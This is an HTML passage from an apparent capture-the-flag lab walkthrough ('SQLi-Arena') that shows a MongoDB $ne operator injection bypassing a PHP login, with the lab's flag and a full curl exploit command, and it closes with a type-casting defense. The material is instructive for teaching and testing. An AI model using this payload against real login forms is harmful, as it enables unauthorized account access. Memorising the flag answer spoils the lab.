<h4>Step 1: Test Normal Login</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login (Wrong Password)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST: </span>username=admin&amp;password=wrongpass<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": "wrongpass"})<br><br>
        <span class="prompt">Output: </span>Invalid username or password.
    </div>
</div>

<h4>Step 2: Inject the $ne Operator</h4>
<p>
    PHP converts <code>password[$ne]=</code> into <code>$_POST['password'] = ['$ne' =&gt; '']</code>.
    In MongoDB, <code>{"$ne": ""}</code> means "not equal to empty string": matching any
    document where the password is not empty. This bypasses authentication.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2: $ne Operator Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">POST: </span>username=admin&amp;password[$ne]=<br>
        <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": {"$ne": ""}})<br><br>
        <span class="prompt">Output: </span>Welcome, <strong>admin</strong>! Role: admin<br>
        You logged in as admin! The flag is: <strong>FLAG{mg_n3_0p3r4t0r_byp4ss}</strong>
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_n3_0p3r4t0r_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab1" \<br>
        &nbsp;&nbsp;-d "login_submit=1&amp;username=admin&amp;password[\$ne]="
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PHP's parameter parsing converts bracket notation like
    <code>password[$ne]=</code> into associative arrays, which MongoDB interprets as query
    operators. The <code>$ne</code> (not equal) operator matches any document where the field
    is not equal to the given value. Defense: always cast user input to the expected type using
    <code>(string)$_POST['password']</code> before passing to MongoDB queries, or use a
    whitelist of allowed parameter types.
</div>
